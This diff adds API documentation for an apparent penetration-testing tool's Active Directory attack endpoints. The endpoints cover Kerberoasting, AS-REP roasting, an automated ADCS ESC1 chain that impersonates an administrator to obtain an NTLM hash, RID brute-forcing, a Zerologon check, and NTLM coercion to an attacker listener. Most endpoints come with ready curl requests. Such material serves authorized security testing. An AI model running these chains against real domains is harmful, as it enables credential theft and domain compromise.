@@ -1,0 +1,711 @@
+---
+title: "AD Attacks"
+description: "API endpoints for authenticated Active Directory attacks and enumeration: BloodHound, Kerberoasting, AS-REP roasting, ADCS/ESC1, domain info, delegation, Zerologon, and Coerce."
+---
+
+All authenticated endpoints support two authentication modes:
+
+- **NTLM / Kerberos password auth:** provide `username`, `password`, `domain`. Set `use_kerberos: true` to add the `-k` flag to netexec commands (requires time sync via `sudo_password`).
+- **Kerberos ccache auth:** set `use_kcache: true` and provide the `ccache_file` filename (basename only). The ccache file must exist in `recon/ccache/`. The username and domain are extracted from the ccache automatically.
+
+DC host and DC IP are always read from the stored network info — they do not need to be passed in every request.
+
+---
+
+## POST /api/bloodhound/run
+
+Collects BloodHound data via `netexec ldap ... --bloodhound --collection All`. The resulting `.zip` file is automatically moved from `~/.nxc/logs/` to `recon/` after completion.
+
+```bash
+curl -X POST http://localhost:8000/api/bloodhound/run \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username": "administrator",
+    "password": "Password1!",
+    "domain": "corp.local"
+  }'
+```
+
+### Request Body
+
+<ParamField body="username" type="string">
+  Domain account username. Required for NTLM/Kerberos password auth.
+</ParamField>
+
+<ParamField body="password" type="string">
+  Account password. Required for NTLM/Kerberos password auth.
+</ParamField>
+
+<ParamField body="domain" type="string">
+  Active Directory domain. Falls back to stored network info if omitted.
+</ParamField>
+
+<ParamField body="use_kerberos" type="boolean">
+  Add `-k` flag to use Kerberos with password credentials. Requires `sudo_password` for time sync.
+</ParamField>
+
+<ParamField body="use_kcache" type="boolean">
+  Authenticate using a Kerberos ccache file. Requires `ccache_file` and `sudo_password`.
+</ParamField>
+
+<ParamField body="ccache_file" type="string">
+  Basename of the ccache file in `recon/ccache/` (e.g. `administrator.ccache`).
+</ParamField>
+
+<ParamField body="sudo_password" type="string">
+  Required when `use_kerberos` or `use_kcache` is `true` (for `ntpdate` time sync).
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  UUID of the scan record.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  Completion summary including DC hostname.
+</ResponseField>
+
+<ResponseField name="command" type="string">
+  NetExec command executed (password redacted).
+</ResponseField>
+
+---
+
+## POST /api/kerberoast/run
+
+Enumerates and extracts Kerberos TGS hashes for service accounts via `netexec ldap ... --kerberoasting`. Hashes are automatically parsed and stored in the credentials database with `source = "kerberoast"`.
+
+```bash
+curl -X POST http://localhost:8000/api/kerberoast/run \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username": "lowpriv",
+    "password": "Pass123!"
+  }'
+```
+
+### Request Body
+
+<ParamField body="username" type="string">
+  Domain account username.
+</ParamField>
+
+<ParamField body="password" type="string">
+  Account password.
+</ParamField>
+
+<ParamField body="domain" type="string">
+  Domain name. Falls back to stored network info.
+</ParamField>
+
+<ParamField body="use_kerberos" type="boolean">
+  Use Kerberos protocol with password credentials.
+</ParamField>
+
+<ParamField body="use_kcache" type="boolean">
+  Use ccache file for authentication.
+</ParamField>
+
+<ParamField body="ccache_file" type="string">
+  ccache filename in `recon/ccache/`.
+</ParamField>
+
+<ParamField body="sudo_password" type="string">
+  Required when time sync is needed.
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  Includes count of hashes imported to credentials database.
+</ResponseField>
+
+---
+
+## POST /api/asreproast/run
+
+Enumerates accounts with Kerberos pre-authentication disabled and captures their AS-REP hashes via `netexec ldap ... --asreproast`. Hashes are automatically stored with `source = "asreproast"`.
+
+### Request Body
+
+Same parameters as `/api/kerberoast/run`: `username`, `password`, `domain`, `use_kerberos`, `use_kcache`, `ccache_file`, `sudo_password`.
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  Includes count of hashes found and imported.
+</ResponseField>
+
+<ResponseField name="output" type="string">
+  Raw netexec output.
+</ResponseField>
+
+---
+
+## POST /api/adcs/run
+
+Enumerates Active Directory Certificate Services vulnerabilities using `certipy-ad find`. Parses the JSON output and stores discovered ESC vulnerabilities in the `adcs_vulns` database table.
+
+```bash
+curl -X POST http://localhost:8000/api/adcs/run \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username": "lowpriv",
+    "password": "Pass123!",
+    "domain": "corp.local"
+  }'
+```
+
+### Request Body
+
+<ParamField body="username" type="string">
+  Domain account username.
+</ParamField>
+
+<ParamField body="password" type="string">
+  Account password.
+</ParamField>
+
+<ParamField body="domain" type="string">
+  Domain. Falls back to stored network info.
+</ParamField>
+
+<ParamField body="target" type="string">
+  DC IP to target. Falls back to stored DC IP.
+</ParamField>
+
+<ParamField body="vulnerable_only" type="boolean">
+  Pass `-vulnerable` to certipy-ad to only return vulnerable templates. Defaults to `true`.
+</ParamField>
+
+<ParamField body="use_kerberos" type="boolean">
+  Use Kerberos protocol.
+</ParamField>
+
+<ParamField body="use_kcache" type="boolean">
+  Use ccache file.
+</ParamField>
+
+<ParamField body="ccache_file" type="string">
+  ccache filename.
+</ParamField>
+
+<ParamField body="sudo_password" type="string">
+  Required for time sync with Kerberos.
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  Summary including target and whether ADCS was found.
+</ResponseField>
+
+---
+
+## GET /api/adcs/vulns
+
+Returns all ADCS vulnerability records stored in the database from the last certipy scan.
+
+```bash
+curl http://localhost:8000/api/adcs/vulns
+```
+
+### Response
+
+<ResponseField name="vulns" type="array">
+  Array of ADCS vulnerability objects.
+
+  <Expandable title="Vulnerability object">
+    <ResponseField name="esc_id" type="string">
+      ESC identifier (e.g. `ESC1`, `ESC4`, `ESC8`).
+    </ResponseField>
+    <ResponseField name="vuln_object" type="string">
+      Name of the vulnerable object (template name or CA name).
+    </ResponseField>
+    <ResponseField name="object_type" type="string">
+      `"Template"` or `"CA"`.
+    </ResponseField>
+    <ResponseField name="vulnerable" type="integer">
+      `1` if marked vulnerable, `0` otherwise.
+    </ResponseField>
+    <ResponseField name="enabled" type="integer">
+      `1` if the template is enabled in AD.
+    </ResponseField>
+    <ResponseField name="enrollment_rights" type="string">
+      Which principals have enrollment rights (e.g. `Domain Users`).
+    </ResponseField>
+    <ResponseField name="details" type="string">
+      Additional certipy details (hostname, flags, etc.).
+    </ResponseField>
+    <ResponseField name="manager_approval" type="integer">
+      `1` if manager approval is required for enrollment.
+    </ResponseField>
+    <ResponseField name="remarks" type="string">
+      Additional notes from certipy analysis.
+    </ResponseField>
+  </Expandable>
+</ResponseField>
+
+---
+
+## POST /api/adcs/esc1/run
+
+Executes the full automated Certipy ESC1 privilege escalation chain in three steps:
+
+1. **Sid** — Query `objectSid` of the target account using `certipy-ad account ... read`.
+2. **Req** — Request a certificate from the vulnerable template using `certipy-ad req`.
+3. **Auth** — Authenticate with the certificate to obtain an NTLM hash using `certipy-ad auth`.
+
+The resulting NTLM hash is automatically saved to the credentials database with `source = "certipy-ESC1"`.
+
+```bash
+curl -X POST http://localhost:8000/api/adcs/esc1/run \
+  -H "Content-Type: application/json" \
+  -d '{
+    "username": "lowpriv",
+    "password": "Pass123!",
+    "domain": "corp.local",
+    "dc_ip": "10.10.10.1",
+    "ca_host": "ca01.corp.local",
+    "ca_name": "corp-CA01-CA",
+    "template": "VulnerableTemplate",
+    "upn": "administrator"
+  }'
+```
+
+### Request Body
+
+<ParamField body="username" type="string" required>
+  Domain account username to authenticate as.
+</ParamField>
+
+<ParamField body="password" type="string" required>
+  Account password.
+</ParamField>
+
+<ParamField body="domain" type="string" required>
+  Active Directory domain.
+</ParamField>
+
+<ParamField body="dc_ip" type="string" required>
+  Domain controller IP.
+</ParamField>
+
+<ParamField body="ca_host" type="string" required>
+  Hostname of the Certificate Authority server.
+</ParamField>
+
+<ParamField body="ca_name" type="string" required>
+  CA name as it appears in certipy output (e.g. `corp-DC01-CA`).
+</ParamField>
+
+<ParamField body="template" type="string" required>
+  Name of the vulnerable certificate template to abuse.
+</ParamField>
+
+<ParamField body="upn" type="string" required>
+  User Principal Name to impersonate in the certificate (typically `administrator`).
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` when the attack chain was launched.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  UUID for polling with `/api/adcs/esc1/status?scan_id=<id>`.
+</ResponseField>
+
+---
+
+## GET /api/adcs/esc1/status
+
+Returns the current state of a running or completed ESC1 attack chain.
+
+```bash
+curl "http://localhost:8000/api/adcs/esc1/status?scan_id=<uuid>"
+```
+
+### Query Parameter
+
+<ParamField query="scan_id" type="string" required>
+  UUID returned by `/api/adcs/esc1/run`.
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `running`, `completed`, `error`, or `not_found`.
+</ResponseField>
+
+<ResponseField name="phase" type="string">
+  Current attack phase: `sid`, `req`, or `auth`.
+</ResponseField>
+
+<ResponseField name="output" type="string">
+  Accumulated log output from all three certipy steps.
+</ResponseField>
+
+<ResponseField name="ntlm_hash" type="string">
+  The captured NTLM hash (populated on completion), or `null`.
+</ResponseField>
+
+<ResponseField name="error" type="string">
+  Error message if status is `error`, otherwise `null`.
+</ResponseField>
+
+---
+
+## POST /api/domain-info/run
+
+Collects domain controller information by running four netexec LDAP queries in parallel:
+- `--dc-list` (DC enumeration)
+- `--pass-pol` (password policy)
+- `-M maq` (Machine Account Quota)
+- `--get-sid` (domain SID)
+
+This is a background operation; the endpoint returns immediately with a `scan_id`.
+
+### Request Body
+
+Same parameters as BloodHound: `username`, `password`, `domain`, `target`, `use_kerberos`, `use_kcache`, `ccache_file`, `sudo_password`.
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` when background tasks were launched.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID for polling.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  `"Domain info scan started in background"`.
+</ResponseField>
+
+---
+
+## POST /api/domain-info/delegation/run
+
+Enumerates Kerberos delegation (unconstrained, constrained, and resource-based) via `netexec ldap ... --find-delegation`. Results are stored in the `delegation` table.
+
+### Request Body
+
+Same auth parameters as BloodHound: `username`, `password`, `domain`, `use_kerberos`, `use_kcache`, `ccache_file`, `sudo_password`.
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  Count of delegation entries found.
+</ResponseField>
+
+<ResponseField name="data" type="array">
+  Array of delegation objects returned directly in the response.
+
+  <Expandable title="Delegation object">
+    <ResponseField name="account_name" type="string">Account with delegation configured.</ResponseField>
+    <ResponseField name="account_type" type="string">`"User"` or `"Computer"`.</ResponseField>
+    <ResponseField name="delegation_type" type="string">`"Unconstrained"`, `"Constrained"`, or `"Resource-Based Constrained"`.</ResponseField>
+    <ResponseField name="delegation_rights_to" type="string">Target SPNs or accounts for constrained delegation.</ResponseField>
+  </Expandable>
+</ResponseField>
+
+---
+
+## GET /api/domain-info/delegation/data
+
+Returns all delegation records stored in the database from the last delegation scan.
+
+```bash
+curl http://localhost:8000/api/domain-info/delegation/data
+```
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on success.
+</ResponseField>
+
+<ResponseField name="delegations" type="array">
+  Array of delegation objects (same schema as above), ordered by account name.
+</ResponseField>
+
+---
+
+## GET /api/domain-info
+
+Returns all domain controller records stored in the database.
+
+```bash
+curl http://localhost:8000/api/domain-info
+```
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on success.
+</ResponseField>
+
+<ResponseField name="data" type="array">
+  Array of DC info objects.
+
+  <Expandable title="Domain info object">
+    <ResponseField name="domain" type="string">Domain name.</ResponseField>
+    <ResponseField name="dc_host" type="string">DC hostname.</ResponseField>
+    <ResponseField name="dc_ip" type="string">DC IP address.</ResponseField>
+    <ResponseField name="dc_info" type="string">Raw netexec DC info string.</ResponseField>
+    <ResponseField name="maq" type="integer">Machine Account Quota value.</ResponseField>
+    <ResponseField name="domain_sid" type="string">Domain SID (e.g. `S-1-5-21-...`).</ResponseField>
+    <ResponseField name="discovered_at" type="string">Discovery timestamp.</ResponseField>
+  </Expandable>
+</ResponseField>
+
+---
+
+## GET /api/password-policy
+
+Returns the domain password policy stored from the last domain info scan.
+
+```bash
+curl http://localhost:8000/api/password-policy
+```
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on success.
+</ResponseField>
+
+<ResponseField name="policy" type="object">
+  Password policy fields.
+
+  <Expandable title="Policy fields">
+    <ResponseField name="domain" type="string">Domain name.</ResponseField>
+    <ResponseField name="min_password_length" type="integer">Minimum password length.</ResponseField>
+    <ResponseField name="password_history_length" type="integer">Number of passwords remembered.</ResponseField>
+    <ResponseField name="max_password_age" type="string">Maximum password age.</ResponseField>
+    <ResponseField name="account_lockout_threshold" type="integer">Failed attempts before lockout.</ResponseField>
+    <ResponseField name="locked_account_duration" type="string">Lockout duration.</ResponseField>
+    <ResponseField name="domain_password_complex" type="integer">`1` if complexity requirements are enabled.</ResponseField>
+  </Expandable>
+</ResponseField>
+
+---
+
+## POST /api/users/rid-brute
+
+Enumerates domain user and group accounts by cycling RIDs over SMB (`netexec smb ... --rid-brute`). No domain credentials are required — a valid SMB session (even null/guest) is sufficient. Results are stored in the `users` and `groups` tables.
+
+```bash
+curl -X POST http://localhost:8000/api/users/rid-brute \
+  -H "Content-Type: application/json" \
+  -d '{
+    "target": "10.10.10.1",
+    "username": "",
+    "password": ""
+  }'
+```
+
+### Request Body
+
+<ParamField body="target" type="string" required>
+  IP or hostname of the target DC or domain-joined host.
+</ParamField>
+
+<ParamField body="username" type="string" required>
+  SMB username (use empty string or `"guest"` for unauthenticated).
+</ParamField>
+
+<ParamField body="password" type="string" required>
+  SMB password (empty string for null session).
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` when the background task was launched.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID.
+</ResponseField>
+
+<ResponseField name="output_file" type="string">
+  Path to the raw netexec output file.
+</ResponseField>
+
+---
+
+## POST /api/users/export
+
+Enumerates domain user accounts with full attributes (last password set, bad password count, description) via `netexec smb ... --users`. Results are stored in the `users` table.
+
+### Request Body
+
+<ParamField body="target" type="string" required>
+  Target DC IP or hostname.
+</ParamField>
+
+<ParamField body="username" type="string" required>
+  Authenticated domain account username.
+</ParamField>
+
+<ParamField body="password" type="string" required>
+  Account password.
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  `"User enumeration completed"`.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID.
+</ResponseField>
+
+---
+
+## POST /api/zerologon/run
+
+Tests for the Zerologon vulnerability (CVE-2020-1472) via `netexec smb <target> -M zerologon`. No credentials required. If `target` is not provided, the stored DC IP is used.
+
+```bash
+curl -X POST http://localhost:8000/api/zerologon/run \
+  -H "Content-Type: application/json" \
+  -d '{"target": "10.10.10.1"}'
+```
+
+### Request Body
+
+<ParamField body="target" type="string">
+  DC IP to test. Falls back to stored DC IP if omitted.
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  Completion message.
+</ResponseField>
+
+<ResponseField name="output" type="string">
+  Full netexec output including vulnerability verdict.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID.
+</ResponseField>
+
+---
+
+## POST /api/coerce/run
+
+Runs the `coerce_plus` NetExec module to force NTLM authentication from a target host to your listener. Supports all coercion methods (PetitPotam, PrintSpooler, DFSCoerce, etc.) and can set `ALWAYS=true` to attempt all methods even after a successful response.
+
+```bash
+curl -X POST http://localhost:8000/api/coerce/run \
+  -H "Content-Type: application/json" \
+  -d '{
+    "target": "10.10.10.1",
+    "listener": "10.10.14.5",
+    "username": "lowpriv",
+    "password": "Pass123!",
+    "domain": "corp.local",
+    "always": true
+  }'
+```
+
+### Request Body
+
+<ParamField body="target" type="string" required>
+  IP or hostname of the machine to coerce (typically the DC).
+</ParamField>
+
+<ParamField body="listener" type="string">
+  IP address of your listener (Responder/ntlmrelayx). Maps to `LISTENER=` module option.
+</ParamField>
+
+<ParamField body="username" type="string">
+  Domain account username for the SMB session. Use empty string for unauthenticated attempts.
+</ParamField>
+
+<ParamField body="password" type="string">
+  Account password.
+</ParamField>
+
+<ParamField body="domain" type="string">
+  Domain name. Falls back to stored network info.
+</ParamField>
+
+<ParamField body="always" type="boolean">
+  Set `ALWAYS=true` to continue attempting all coercion methods even after one succeeds. Defaults to `false`.
+</ParamField>
+
+<ParamField body="method" type="string">
+  Restrict to a specific coercion method (e.g. `"PetitPotam"`, `"PrintSpooler"`). When omitted, all methods are attempted.
+</ParamField>
+
+### Response
+
+<ResponseField name="status" type="string">
+  `"success"` on completion.
+</ResponseField>
+
+<ResponseField name="message" type="string">
+  Completion summary.
+</ResponseField>
+
+<ResponseField name="output" type="string">
+  Full netexec output.
+</ResponseField>
+
+<ResponseField name="scan_id" type="string">
+  Scan UUID.
+</ResponseField>
+
+<ResponseField name="command" type="string">
+  NetExec command executed.
+</ResponseField>
